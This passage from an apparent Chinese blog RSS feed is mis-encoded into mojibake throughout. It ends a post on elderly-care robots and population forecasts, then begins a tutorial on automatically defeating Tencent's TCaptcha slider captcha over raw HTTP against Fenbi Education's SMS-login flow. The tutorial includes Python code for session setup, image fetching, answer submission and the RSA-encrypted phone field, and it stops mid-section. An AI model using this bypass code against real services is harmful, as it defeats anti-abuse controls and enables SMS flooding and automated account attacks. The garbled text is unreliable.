<p>çè²çé¢è®¡å¨1.1-1.2ä¹é´ï¼æ»äººå£ä»14äº¿éæ­¥åè½è³12äº¿å·¦å³ãå»èæºå¨äººå¸åºå·²è¿å¥å¿«éå¢é¿ééï¼ä»2023å¹´ç66äº¿åï¼é¢è®¡å°2029å¹´å¢è³159äº¿åï¼2030å¹´åå¢éè¿ä¸æ­¥å å¿«ãè¿ä¸é¶æ®µçæºå¨äººä»è¾å©èµ°åä¸»åââ2035å¹´ååï¼ææ¬ææéè³5ä¸åä»¥åï¼æç§æ¨¡å¼å¼å§æ®åãæºå¨äººæå¡å¼å§å®è´¨æ§åæå»èååã</p>
<h3 id="2050-2080æºå¨äººæçæ">2050-2080ï¼æºå¨äººæçæ</h3>
<p>çè²çååè³1.2-1.3çå®å¨åºé´ï¼äººå£ç¨³å®å¨9äº¿-10äº¿ãæºå¨äººæ¿ä»£70%-80%çåºç¡å³å¨ï¼äººå½¢æºå¨äººå¯ä»¥å®æå¨æµç¨ç§æ¤ãå¸åºè§æ¨¡è¿å¥ä¸äº¿çº§å«ï¼åå°æºå¨äººææ¬éè³1ä¸-3ä¸åï¼æèæç§ä¸¤ä¸ååãé¿ææ¤çä¿é©å¨é¢è¦çï¼å»èæå¡å®ç°æ ååãæ®æ åã</p>
<h3 id="2080-2126æºè½æææ">2080-2126ï¼æºè½æææ</h3>
<p>çè²çä¿æå¨1.0-1.2ï¼äººå£ç¨³å®å¨6äº¿-8äº¿ãæºå¨äººæ¿ä»£90%ä»¥ä¸çéå¤æ§å³å¨ï¼ä¸éç¨AIæ·±åº¦èåï¼ä¸ä»è½ç§é¡¾èº«ä½ï¼è¿è½ç²¾ç¥éªä¼´ãé¢å¤å¥åº·é®é¢ãæºå¨äººå³æå¡ï¼RaaSï¼æ¨¡å¼æ®åï¼ä¸ªäººå­æ¬¾ãå»èéãåä¸ä¿é©å±åæ¯ä»æºå¨äººæå¡ï¼å»èææ¬è¿ä¸æ­¥éä½ã</p>
<h2 id="ååä¸äº¿çº§äº§ä¸æ¯æå»èé­ç¯">åãåä¸äº¿çº§äº§ä¸ï¼æ¯æå»èé­ç¯</h2>
<p>è¿ä¸åçæ ¹åºæ¯æºå¨äººäº§ä¸ãç®åæºè½å·¡æ£æºå¨äººå¸åºè§æ¨¡å·²è¶230äº¿åï¼æ ¸å¿é¶é¨ä»¶å½äº§åçè¶60%ï¼ææ¬æç»­ä¸éãå»èæºå¨äººäº§ä¸é¾ä¸äººå½¢æºå¨äººé«åº¦ååï¼è¿ææ½å¨å¸åºç©ºé´è¶ä¸äº¿åã</p>
<p>æ¯ä»ç«¯ä¹å¨éæ­¥å®åï¼åºæ¬å»èä¿é©ãé¿ææ¤çä¿é©ãåä¸å»èéèææä¸éä¿éãæºå¨äººäº§ä¸è¶æçï¼å»èææ¬è¶ä½ï¼ç§æè¿æ­¥ççº¢å©æç»ä¼è½å°æ®éäººèº«ä¸ã</p>
<h2 id="äºå®ä½åºçº¿ä¸ªäººéæ©ä¸å½å®¶æç¥çå¹³è¡¡">äºãå®ä½åºçº¿ï¼ä¸ªäººéæ©ä¸å½å®¶æç¥çå¹³è¡¡</h2>
<p>åå°å¼å¤´é£äºå¹´è½»äººçç­è®®âââä¸çå¨ãå­é±ä¹°æºå¨äººå»èâãä»ä¸ªäººè§åº¦ï¼è¿æ¯ä¸ä¸ªçæ§çéæ©ï¼ä¸å¼å¾æè´£ãä½å½å®¶å¿é¡»å®ä½ä¸æ¡åºçº¿ï¼çè²çéè¦ç»´æå¨1.2å·¦å³ï¼ç¡®ä¿æè¶³å¤çäººå£æ¯æç åãè¿ç»´ååæ°ã</p>
<p>åº¦è¿æªæ¥åå¹´çå±é©å¹³è¡¡æï¼éè¦ä¸ç®¡é½ä¸ï¼ä¸æ¯å å¿«æºå¨äººææ¯ç ååææ¬ä¸éï¼äºæ¯å®åé¿ææ¤çä¿é©åå»èéä½ç³»ï¼ä¸æ¯éå½é¼å±çè²å®ä½äººå£å®å¨çº¿ã</p>
<p>æªæ¥çç¤¾ä¼ï¼å°æ¯å¤åå±ççæ ¼å±ï¼ä¸é¨åå®¶åº­çè²ï¼å®ä½äººå£åºç¡ï¼ä¸é¨åäººå¨èï¼äº«åç§æçº¢å©ï¼æºå¨äººå¡«è¡¥å³å¨åç¼ºå£ãä¸ªäººéæ©ä¸å½å®¶åå±ä¸æ¯å¯¹ç«çï¼èæ¯äºè¡¥çã</p>
<p>æ¥æé£å ä¸ªææ³èåçæºå¨äººï¼æå¼çä¸ä»æ¯ä¸ä¸ªèç®ççªå£ãå®é¢ç¤ºçä¸ä¸ªç±ç§æé©±å¨ãæçæ¯æãèµéä¿éãäººå£æåºçæ°æ¶ä»£ãä½éåè¿ä¸ªæ¶ä»£çè·¯ä¸ï¼æåå¹´å·¦å³çè°é¾å¹³è¡¡æéè¦è·¨è¶ãè·¨è¿å»ï¼å°±æ¯ç§æè®©çæ´»æ´å®ç¨³ãè®©å»èæ´æå°ä¸¥ãè®©å½å®¶åå±æ´å¯æç»­çæªæ¥ã</p>


</div>
<div class="clear"></div>
</div>
		<p class="postfoot">
			posted on 
<span id="post-date" data-last-update-days="0.7659722222222223" data-date-updated="2026-02-18 13:26">2026-02-17 19:03</span>&nbsp;
<a href="https://www.cnblogs.com/xdesigner">è¢æ°¸ç¦ çµå­çåï¼å»çä¿¡æ¯å</a>&nbsp;
éè¯»(<span id="post_view_count">218</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19621864);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19621864', targetLink: 'https://www.cnblogs.com/xdesigner/p/19621864', title: 'ä»æ¥ææºå¨äººï¼çä¸­å½æªæ¥ç¾å¹´çå»èä¹è·¯' })">ä¸¾æ¥</a>

		</p>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ»åè¾è®¯ TCaptcha æ»åéªè¯ç ï¼çº¯ HTTP åè®®éåå®æ ]]></title>
    <link>https://www.cnblogs.com/han5562877/p/19621722/overcoming-tencent-tcaptcha-208tlo</link>
    <guid>19d2747dc7399ced7711a1df59f9f2a2</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/han5562877/p/19621722/overcoming-tencent-tcaptcha-208tlo" title="åå¸äº 2026-02-17 17:25">
    <span role="heading" aria-level="2">æ»åè¾è®¯ TCaptcha æ»åéªè¯ç ï¼çº¯ HTTP åè®®éåå®æ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æè®°å½äºä¸æ¬¡å¯¹è¾è®¯ TCaptcha æ»åéªè¯ç çå®æ´éåå·¥ç¨å®è·µï¼ä»¥ç²ç¬æè²ç»å½æµç¨ä¸ºç ç©¶å¯¹è±¡ï¼éè¿çº¯ HTTP åè®®å®ç°äºå¨èªå¨åç ´è§£ï¼éè¿çè¾¾å° 100%ã
æ ¸å¿ææåæ¬ï¼ä¸é¶æ®µåè®®å®æ´è¿åãNCC æ¨¡æ¿å¹éç®æ³ä¼åãPoW å·¥ä½éè¯æé«ææ±è§£ï¼ä»¥å TDC.js æ··æ·èææºçæ§è¡ä¸è¡ä¸ºè½¨è¿¹ä»¿çã
éåä» HAR æåå¥æï¼æ¢³çåºé£æ§è§¦ååä¸å¡ç³»ç»è¿å contextIdãåç«¯å è½½è¾è®¯éªè¯ç  iframeãç¨æ·éªè¯æååè·å ticket å randstrãåæäº¤ captcha/check è§£é¤é£æ§çå®æ´é¾è·¯ãéªè¯ç ç³»ç»ä¸ä¸å¡ç³»ç»è§£è¦ï¼å¯ç¬ç«æ»å TCaptcha åå°å­è¯æäº¤ä¸å¡æ¥å£å³å¯ã
åæ¶è¿åäºåéç­ä¿¡éªè¯ç æ¥å£æéç RSA/ECB/PKCS#1 v1.5 å å¯ info å­æ®µï¼ææºå·+æ¶é´æ³ï¼ï¼å¹¶ç¨çº¯ Python å®ç°äºæ åå¡«åçå å¯è¿ç¨ã
æ¬æä¸ºåç»­åè®®åæãå¾åå¤çãç®æ³è®¾è®¡åèææºæ§è¡ç­ç¯èå¥ å®äºåºç¡ï¼æç»æå»ºåºä¸å¥ç¨³å®ãå¯å¤ç¨ççº¯ HTTP èªå¨åè§£å³æ¹æ¡ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="æ»åè¾è®¯-tcaptcha-æ»åéªè¯ç çº¯-http-åè®®éåå®æ">æ»åè¾è®¯ TCaptcha æ»åéªè¯ç ï¼çº¯ HTTP åè®®éåå®æ</h1>
<p>æ¬æè®°å½äºä¸æ¬¡å®æ´çéªè¯ç éåå·¥ç¨å®è·µï¼ä»åè®®åæãå¾åå¤çãç®æ³è®¾è®¡å° JavaScript VM æ§è¡ï¼æç»å®ç°äºå¯¹è¾è®¯ TCaptcha æ»åéªè¯ç çå¨èªå¨åç ´è§£ï¼éè¿çè¾¾å° 100%ã</p>
<h2 id="ä¸ææ¯æææ¦è¿°">ä¸ãææ¯æææ¦è¿°</h2>
<p>è¾è®¯ TCaptcha æ¯å½åä¸»æµçæ»åéªè¯ç æ¹æ¡ï¼è¢«å¹¿æ³åºç¨äºåå¤§äºèç½å¹³å°çé£æ§ç³»ç»ä¸­ãæ¬é¡¹ç®ä»¥ç²ç¬æè²çç»å½æµç¨ä¸ºç ç©¶å¯¹è±¡ï¼æ ¸å¿ç®æ æ¯å¨ä¸ä¾èµ Selenium æ Playwright ç­æµè§å¨èªå¨åå·¥å·çåæä¸ï¼éè¿çº¯ HTTP åè®®æ¨¡æå®ç°éªè¯ç çèªå¨åç ´è§£ãè¿è¦æ±æä»¬ä¸ä»è¦å®ç°äºåç´ çº§å«çæ¼å¾åä½ç½®è®¡ç®ï¼è¿éè¦ç»è¿è®¾å¤æçº¹ãè¡ä¸ºè½¨è¿¹ç­å¤ç»´åº¦çæ£æµæºå¶ï¼æç»æå»ºåºä¸å¥ç¨³å®ãå¯å¤ç¨çå·¥ç¨åè§£å³æ¹æ¡ã</p>
<p>æ´ä¸ªé¡¹ç®é¢ä¸´çæ ¸å¿ææ¯é¾ç¹åæ¬ TCaptcha ä¸é¶æ®µåè®®çå®æ´è¿åãNCC æ¨¡æ¿å¹éç®æ³çä¼åä¸å®ç°ãPoW å·¥ä½éè¯æçé«ææ±è§£ï¼ä»¥åæå°é¾ç TDC.js æ··æ·èææºçæ§è¡ä¸è½¨è¿¹ä»¿çãè¿äºææç¯ç¯ç¸æ£ï¼ä»»ä½ä¸ä¸ªç¯èçå¤±è´¥é½ä¼å¯¼è´æ´ä¸ªéªè¯æµç¨æ æ³éè¿ã</p>
<h2 id="äºåç½®åå¤ä¸å¡æµç¨éå">äºãåç½®åå¤ï¼ä¸å¡æµç¨éå</h2>
<h3 id="21-har-æåä¸åè®®åæ">2.1 HAR æåä¸åè®®åæ</h3>
<p>ä¸åä» Chrome DevTools çç½ç»æåå¼å§ãéè¿å½å¶å®æ´çç»å½æµç¨ï¼æä»¬åç°å½æå¡ç«¯æ£æµå°å¼å¸¸è¯·æ±æ¶ï¼åéç­ä¿¡éªè¯ç çæ¥å£ä¼è¿å HTTP 430 ç¶æç ï¼ååºä½ä¸­åå«ä¸ä¸ª contextId å­æ®µãè¿ä¸ª contextId æ¯åç»­éªè¯ç æ ¡éªçä¼è¯æ è¯ï¼åç«¯ä¼å¼¹åº iframe å è½½è¾è®¯éªè¯ç é¡µé¢ãç¨æ·å®ææ»åéªè¯åï¼åç«¯ä¼è·å¾ ticket å randstr ä¸¤ä¸ªå­è¯ï¼ç¶åè°ç¨ captcha/check æ¥å£æäº¤è¿ä¸¤ä¸ªå­è¯æ¥è§£é¤é£æ§ï¼æåå¸¦ç contextId éè¯åéç­ä¿¡è¯·æ±ã</p>
<p>å®æ´çé£æ§è§¦åé¾è·¯å¦ä¸ï¼</p>
<pre><code>POST /users/phone/verification
  â è¿å HTTP 430
  {
    "contextId": "abc123..."
  }
  â
[åç«¯å¼¹åº TCaptcha iframe]
  â ç¨æ·å®ææ»åéªè¯
  {
    "ticket": "t123...",
    "randstr": "r456..."
  }
  â
POST /users/captcha/check
  Body: {
    "contextId": "abc123...",
    "tencentticket": "t123...",
    "tencentrandstr": "r456..."
  }
  â è¿å 200 OK
POST /users/phone/verification?abxContextId=abc123...
  â è¿å 200 OKï¼ç­ä¿¡åéæå
</code></pre>
<p>è¿ä¸ªæµç¨æ­ç¤ºäºä¸ä¸ªå³é®ç¹ï¼éªè¯ç ç³»ç»ä¸ä¸å¡ç³»ç»æ¯è§£è¦çãä¸å¡ç³»ç»åªè´è´£è§¦åé£æ§åæ ¡éªå­è¯ï¼çæ­£çéªè¯ç äº¤äºå®å¨åçå¨è¾è®¯çååä¸ãè¿æå³çæä»¬å¯ä»¥ç¬ç«å°æ»å TCaptcha éªè¯ç ï¼ç¶åå°è·å¾ç ticket å randstr æäº¤ç»ä¸å¡ç³»ç»å³å¯ã</p>
<h3 id="22-rsa-å å¯åæ°è¿å">2.2 RSA å å¯åæ°è¿å</h3>
<p>å¨åæ HAR æä»¶æ¶ï¼æä»¬æ³¨æå°åéç­ä¿¡éªè¯ç çæ¥å£éè¦ä¸ä¸ªåä¸º info çå­æ®µãéè¿æç´¢åç«¯æååç JavaScript ä»£ç ï¼æä»¬å¨ main-es2015.js ä¸­æ¾å°äºå å¯é»è¾ï¼</p>
<pre><code class="language-javascript">// åç«¯å å¯é»è¾ï¼ref/js/main-es2015.*.jsï¼
function encryptPhone(phone) {
    var publicKey = "ANKi9PWuvDOsagwIVvrPx77mXNV0APmjySsYjB1/GtUT...";
    var timestamp = new Date().getTime();
    var plaintext = phone + ":" + timestamp;
    return encrypt(publicKey, plaintext);
}
</code></pre>
<p>è¿ä¸ª info å­æ®µæ¯å¯¹ææºå·åæ¶é´æ³ç RSA å å¯ç»æï¼æ ¼å¼ä¸º <code>encrypt(publicKey, "{phone}:{timestamp_ms}")</code>ãå¬é¥æ¨¡æ°ä»¥ Base64 æ ¼å¼ç¡¬ç¼ç å¨åç«¯ä»£ç ä¸­ï¼ææ°åºå®ä¸º 0x10001ï¼å å¯ç®æ³æ¯æ åç RSA/ECB/PKCS#1 v1.5ã</p>
<p>ä¸ºäºé¿åå¼å¥é¢å¤çå¯ç å­¦åºä¾èµï¼æä»¬ç¨çº¯ Python å®ç°äºè¿ä¸ªå å¯è¿ç¨ãPKCS#1 v1.5 padding çæ ¼å¼æ¯ <code>0x00 || 0x02 || PS || 0x00 || M</code>âï¼å¶ä¸­ PS æ¯éé¶éæºå­èåºåï¼é¿åº¦ä¸º <code>k - len(M) - 3</code>ï¼k æ¯æ¨¡é¿ãå®ç°ä»£ç å¦ä¸ï¼</p>
<pre><code class="language-python"># fenbi_auth/utils/rsa_encrypt.py

import base64
import secrets
from dataclasses import dataclass

RSA_EXPONENT_65537 = 0x10001

def _nonzero_random_bytes(n: int, randfunc) -&gt; bytes:
    """çæ n ä¸ªé 0 éæºå­èï¼PKCS#1 v1.5 padding éè¦ï¼ã"""
    out = bytearray()
    while len(out) &lt; n:
        chunk = bytearray(randfunc(n - len(out)))
        chunk = bytearray(b for b in chunk if b != 0)
        out.extend(chunk)
    return bytes(out[:n])

@dataclass(frozen=True)
class RsaPublicKey:
    n: int  # æ¨¡æ°
    e: int = RSA_EXPONENT_65537  # ææ°
    
    @property
    def k(self) -&gt; int:
        """æ¨¡é¿ï¼å­èï¼ã"""
        return (self.n.bit_length() + 7) // 8

def rsa_encrypt_pkcs1_v1_5_base64(key: RsaPublicKey, plaintext: str) -&gt; str:
    """RSA/ECB/PKCS#1 v1.5 å å¯ï¼å¹¶è¾åº Base64 å­ç¬¦ä¸²ã"""
    m = plaintext.encode("utf-8")
    k = key.k
    
    if len(m) &gt; k - 11:
        raise ValueError("ææè¿é¿ï¼æ æ³è¿è¡ PKCS#1 v1.5 padding")
    
    # PKCS#1 v1.5 padding: 0x00 || 0x02 || PS(éé¶éæº) || 0x00 || M
    ps_len = k - len(m) - 3
    ps = _nonzero_random_bytes(ps_len, secrets.token_bytes)
    em = b"\x00\x02" + ps + b"\x00" + m
    
    # RSA å å¯ï¼c = m^e mod n
    em_int = int.from_bytes(em, "big")
    c_int = pow(em_int, key.e, key.n)
    c = c_int.to_bytes(k, "big")
    
    return base64.b64encode(c).decode("ascii")

def build_phone_verification_info(public_key_b64: str, phone: str, timestamp_ms: int) -&gt; str:
    """çæ /users/phone/verification æéç info å­æ®µã"""
    key = RsaPublicKey.from_fenbi_public_key_b64(public_key_b64)
    return rsa_encrypt_pkcs1_v1_5_base64(key, f"{phone}:{timestamp_ms}")
</code></pre>
<p>è¿ä¸ªå®ç°æå ä¸ªå³é®ç¹ãç¬¬ä¸ï¼PKCS#1 v1.5 padding è¦æ±å¡«åå­èå¿é¡»éé¶ï¼æä»¬ä½¿ç¨ <code>secrets.token_bytes</code>â çæå¯ç å­¦å®å¨çéæºæ°ï¼ç¶åè¿æ»¤æææç 0 å­èãç¬¬äºï¼å¤§æ´æ°è¿ç®ä½¿ç¨ Python åç½®ç <code>pow(m, e, n)</code> å®ç°æ¨¡å¹è¿ç®ï¼è¿æ¯ Python æ ååºæä¾çé«æå®ç°ï¼æ éå¼å¥ç¬¬ä¸æ¹åºãç¬¬ä¸ï¼æ´ä¸ªå®ç°ä¸å° 80 è¡ä»£ç ï¼å®å¨ä¸ä¾èµ PyCryptoãcryptography ç­å¯ç å­¦åºã</p>
<p>è³æ­¤ï¼ä¸å¡å±çåè®®å·²ç»å®å¨è¿åãæ¥ä¸æ¥çæ ¸å¿æææ¯å¦ä½èªå¨åéè¿è¾è®¯ TCaptcha æ»åéªè¯ç ã</p>
<h2 id="ä¸tcaptcha-åè®®éåä¸é¶æ®µæ»é²">ä¸ãTCaptcha åè®®éåï¼ä¸é¶æ®µæ»é²</h2>
<h3 id="31-åè®®æ¶æåæ">3.1 åè®®æ¶æåæ</h3>
<p>TCaptcha çäº¤äºæµç¨æ¶åä¸ä¸ªæ ¸å¿æ¥å£ï¼å¨é¨ä½äº turing.captcha.qcloud.com ååä¸ãç¬¬ä¸ä¸ªæ¥å£æ¯ cap_union_prehandleï¼è´è´£åå§åä¼è¯å¹¶è·åå¾çéç½®åå®å¨åæ°ãç¬¬äºä¸ªæ¥å£æ¯ cap_union_new_getcapbysigï¼ç¨äºä¸è½½èæ¯å¾ååæ¯ç²¾çµå¾ãç¬¬ä¸ä¸ªæ¥å£æ¯ cap_union_new_verifyï¼ç¨äºæäº¤ç­æ¡å¹¶è·åæç»ç ticket å randstr å­è¯ã</p>
<h4 id="é¶æ®µä¸prehandle-ä¼è¯åå§å">é¶æ®µä¸ï¼prehandle ä¼è¯åå§å</h4>
<p>prehandle æ¥å£çè¯·æ±åæ°åå«äºä¸å¡æ¹ç TCaptcha APP_IDãåè®®ç±»åãå®¢æ·ç«¯ç±»åãè¯­è¨è®¾ç½®ç­ä¿¡æ¯ãå¶ä¸­ User-Agent éè¦è¿è¡ Base64 ç¼ç ï¼subsid åæ°è¡¨ç¤ºéè¯æ¬¡æ°ï¼æ¯æ¬¡å¤±è´¥åéè¦éå¢ãå®æ´çè¯·æ±åæ°å¦ä¸ï¼</p>
<pre><code class="language-python"># fenbi_auth/captcha/tcaptcha_client.py

def prehandle(aid: str, entry_url: str = "", *, subsid: int = 1) -&gt; CaptchaLayout:
    """è°ç¨ TCaptcha prehandle æ¥å£ï¼åå§åéªè¯ä¼è¯ã"""
    ua_b64 = base64.b64encode(_UA.encode()).decode()
    
    params = {
        "aid": aid,                    # ä¸å¡æ¹ç TCaptcha APP_ID
        "protocol": "https",
        "accver": "1",
        "showtype": "embed",
        "ua": ua_b64,                  # User-Agent Base64 ç¼ç 
        "noheader": "1",
        "fb": "0",
        "aged": "0",
        "enableAged": "0",
        "enableDarkMode": "0",
        "grayscale": "1",
        "clientype": "2",              # å®¢æ·ç«¯ç±»åï¼2=Webï¼
        "cap_cd": "",
        "uid": "",
        "lang": "zh-cn",
        "entry_url": entry_url,
        "elder_captcha": "0",
        "js": "/tcaptcha-frame.5bae14dd.js",
        "login_appid": "",
        "wb": "2",
        "subsid": str(subsid),         # éè¯æ¬¡æ°ï¼å¤±è´¥åéå¢ï¼
        "callback": "_aq_000001",      # JSONP åè°å½æ°å
        "sess": "",
    }
    
    url = f"{_BASE}/cap_union_prehandle?{urllib.parse.urlencode(params)}"
    raw = _get(opener, url).decode("utf-8")
    data = _parse_jsonp(raw)  # è§£æ JSONP ååº
    
    # æåå³é®éç½®ä¿¡æ¯
    sess = data.get("sess", "")
    dyn = data["data"]["dyn_show_info"]
    comm_cfg = data["data"]["comm_captcha_cfg"]
    
    return CaptchaLayout(
        sess=sess,
        bg_img_url=dyn["bg_elem_cfg"]["img_url"],
        fg_elem_list=parse_fg_elements(dyn["fg_elem_list"]),
        pow_cfg=parse_pow_config(comm_cfg.get("pow_cfg")),
        tdc_path=comm_cfg.get("tdc_path", "")
    )
</code></pre>
<p>ååºæ¯ JSONP æ ¼å¼ï¼éè¦åå»é¤åè°å½æ°åè£¹ï¼ç¶åè§£æ JSONãååºä¸­æå³é®çæ¯ sess å­æ®µï¼è¿æ¯ä¼è¯æ è¯ï¼è´¯ç©¿æ´ä¸ªéªè¯æµç¨ãdyn_show_info é¨ååå«äºèæ¯å¾ååæ¯åç´ çéç½®ä¿¡æ¯ï¼</p>
<pre><code class="language-json">{
  "sess": "0a1b2c3d4e5f...",
  "data": {
    "dyn_show_info": {
      "bg_elem_cfg": {
        "img_url": "/cap_union_new_getcapbysig?image=xxx&amp;sess=xxx",
        "width": 672,
        "height": 390
      },
      "fg_elem_list": [
        {
          "id": 1,
          "sprite_pos": [10, 20],      // å¨ç²¾çµå¾ä¸­çè£åªä½ç½® (x, y)
          "size_2d": [68, 68],         // æ¼å¾åå°ºå¯¸ (width, height)
          "init_pos": [30, 161],       // åå§åæ ï¼æ»åèµ·ç¹ï¼
          "move_cfg": {"direction": 0} // ç§»å¨æ¹åï¼0=æ°´å¹³ï¼1=åç´ï¼
        }
      ]
    },
    "comm_captcha_cfg": {
      "pow_cfg": {
        "prefix": "1:3FhYxv:",
        "md5": "a1b2c3d4e5f6..."
      },
      "tdc_path": "/TDC_1.0.3.js"
    }
  }
}
</code></pre>
<p>fg_elem_list æè¿°äºæ¼å¾åå¨ç²¾çµå¾ä¸­çä½ç½®ååå§åæ ãsprite_pos æ¯è£åªèµ·ç¹ï¼size_2d æ¯è£åªå°ºå¯¸ï¼init_pos æ¯æ¼å¾åå¨èæ¯å¾ä¸çåå§ä½ç½®ãè¿äºä¿¡æ¯å¯¹äºåç»­ç NCC æ¨¡æ¿å¹éè³å³éè¦ã</p>
<h4 id="é¶æ®µäºå¾çä¸è½½ä¸ç²¾çµå¾è£åª">é¶æ®µäºï¼å¾çä¸è½½ä¸ç²¾çµå¾è£åª</h4>
<p>èæ¯å¾ååæ¯ç²¾çµå¾éè¿åä¸ä¸ªæ¥å£ä¸è½½ï¼ç¨ img_index åæ°åºåãimg_index=1 è¡¨ç¤ºèæ¯å¾ï¼è¿æ¯ä¸å¼  672Ã390 ç RGB PNG å¾çï¼åå«äºç¼ºå£çé´å½±ãimg_index=0 è¡¨ç¤ºåæ¯ç²¾çµå¾ï¼è¿æ¯ä¸å¼  682Ã620 ç RGBA PNG å¾çï¼åå«äºæ¼å¾ååæ»åæé®ã</p>
<p>åæ¯ç²¾çµå¾æ¯ä¸å¼  sprite sheetï¼éè¦æ ¹æ® fg_elem_list ä¸­ç sprite_pos å size_2d å­æ®µè£åªåºæ¼å¾åãè£åªé»è¾å¦ä¸ï¼</p>
<pre><code class="language-python"># fenbi_auth/captcha/tcaptcha_client.py

def download_images(layout: CaptchaLayout, opener) -&gt; CaptchaImages:
    """ä¸è½½èæ¯å¾ååæ¯ç²¾çµå¾ï¼å¹¶è£åªåºæ¼å¾åã"""
    # ä¸è½½èæ¯å¾ï¼img_index=1ï¼
    bg_bytes = _get(opener, layout.bg_img_url)
    
    # ä¸è½½åæ¯ç²¾çµå¾ï¼img_index=0ï¼
    # æé  fg_img_urlï¼ä¸ bg_img_url å image/sessï¼ä½ img_index=0
    image_id = _extract_image_id_from_url(layout.bg_img_url)
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(layout.bg_img_url).query)
    sess_val = qs.get("sess", [""])[0]
    fg_img_url = f"{_BASE}/cap_union_new_getcapbysig?img_index=0&amp;image={image_id}&amp;sess={sess_val}"
    fg_bytes = _get(opener, fg_img_url)
    
    # ä»ç²¾çµå¾ä¸­è£åªæ¼å¾å
    fg_img = Image.open(io.BytesIO(fg_bytes))
    piece = layout.piece_elem
    px, py = piece.sprite_pos  # è£åªèµ·ç¹
    pw, ph = piece.size_2d     # è£åªå°ºå¯¸
    
    # è£åªï¼crop((left, top, right, bottom))
    piece_img = fg_img.crop((px, py, px + pw, py + ph))
    
    return CaptchaImages(
        bg_bytes=bg_bytes,
        fg_bytes=fg_bytes,
        piece_rgba=np.array(piece_img),  # è½¬ä¸º NumPy æ°ç»ä¾ NCC ä½¿ç¨
        layout=layout
    )
</code></pre>
<p>è£åªåçæ¼å¾åæ¯ä¸å¼  RGBA å¾çï¼åå«éæééãè¿ä¸ªéæééå¨åç»­ç NCC æ¨¡æ¿å¹éä¸­éå¸¸éè¦ï¼æä»¬ä¼ç¨å®ä½ä¸ºæ©ç ï¼åªå¹éä¸éæåºåã</p>
<h4 id="é¶æ®µä¸verify-ç­æ¡æäº¤">é¶æ®µä¸ï¼verify ç­æ¡æäº¤</h4>
<p>verify æäº¤é¶æ®µæ¯æå¤æçé¨åãPOST body éè¦åå«ä¸ä¸ªå­æ®µï¼æ¯ä¸ªå­æ®µé½æä¸¥æ ¼çæ ¼å¼è¦æ±ï¼</p>
<pre><code class="language-python"># fenbi_auth/captcha/tcaptcha_client.py

def submit_verify(
    layout: CaptchaLayout,
    ans: str,
    pow_answer: str,
    pow_calc_time: int,
    *,
    collect: str,
    tlg: int,
    eks: str,
    opener
) -&gt; VerifyResult:
    """æäº¤éªè¯ç­æ¡å° TCaptcha verify æ¥å£ã"""
    body = {
        "ans": ans,                    # ç­æ¡ JSON
        "sess": layout.sess,           # ä¼è¯æ è¯
        "pow_answer": pow_answer,      # PoW ç­æ¡ï¼prefix+nonceï¼
        "pow_calc_time": str(pow_calc_time),  # PoW è®¡ç®èæ¶ï¼æ¯«ç§ï¼
        "collect": collect,            # tdc.js çæçè®¾å¤æçº¹+è½¨è¿¹
        "tlg": str(tlg),               # æ»å¨æ»èæ¶ï¼æ¯«ç§ï¼
        "eks": eks,                    # tdc.js ååµçå å¯ç­¾å
    }
    
    url = f"{_BASE}/cap_union_new_verify"
    response = _post(opener, url, urllib.parse.urlencode(body))
    data = json.loads(response.decode("utf-8"))
    
    return VerifyResult(
        ok=(data.get("errorCode") == 0),
        ticket=data.get("ticket", ""),
        randstr=data.get("randstr", ""),
        error_code=data.get("errorCode"),
        error_msg=data.get("errMsg", "")
    )
</code></pre>
<p>ans å­æ®µçæ ¼å¼æ¯ä¸ä¸ª JSON æ°ç»ï¼åå« elem_idãtype å data ä¸ä¸ªå­æ®µï¼</p>
<pre><code class="language-python">def build_ans(elem_id: int, target_x: int, target_y: int) -&gt; str:
    """æé  verify è¯·æ±ç ans å­æ®µã"""
    ans = [
        {
            "elem_id": elem_id,              # åç´  IDï¼ä» fg_elem_list è·åï¼
            "type": "DynAnswerType_POS",     # ç­æ¡ç±»åï¼ä½ç½®ï¼
            "data": f"{target_x},{target_y}" # ç®æ åæ ï¼éå·åéï¼
        }
    ]
    return json.dumps(ans, separators=(",", ":"))
</code></pre>
<p>è¿ä¸ä¸ªå­æ®µç¼ºä¸ä¸å¯ï¼ä»»ä½ä¸ä¸ªå­æ®µçéè¯¯é½ä¼å¯¼è´éªè¯å¤±è´¥ãå¶ä¸­ ans éè¦ç²¾ç¡®è®¡ç®æ¼å¾åçç®æ åæ ï¼è¯¯å·® &gt; 5px ä¼å¤±è´¥ï¼ï¼pow_answer éè¦æ´åæç´¢ MD5 ç¢°æï¼collect å eks ç±æ··æ·ç tdc.js çæï¼æ æ³ç´æ¥æ¨¡æãæ¥ä¸æ¥æä»¬å°éä¸æ»åè¿äºé¾ç¹ã</p>
<h3 id="32-æ ¸å¿ç®æ³ncc-æ¨¡æ¿å¹éæ±è§£æ»åä½ç§»">3.2 æ ¸å¿ç®æ³ï¼NCC æ¨¡æ¿å¹éæ±è§£æ»åä½ç§»</h3>
<p>æ»åéªè¯ç çæ¬è´¨é®é¢æ¯ï¼ç»å®èæ¯å¾ï¼å«ç¼ºå£ï¼åæ¼å¾åï¼æ±åºæ¼å¾åéè¦æ°´å¹³ç§»å¨å¤å°åç´ æè½å¡«å¥ç¼ºå£ãè¿ä¸ªé®é¢çä¼¼ç®åï¼ä½è¦è¾¾å°äºåç´ çº§çç²¾åº¦å¹¶ä¸å®¹æã</p>
<h4 id="æ¹æ¡éåncc-vs-æ·±åº¦å­¦ä¹ ">æ¹æ¡éåï¼NCC vs æ·±åº¦å­¦ä¹ </h4>
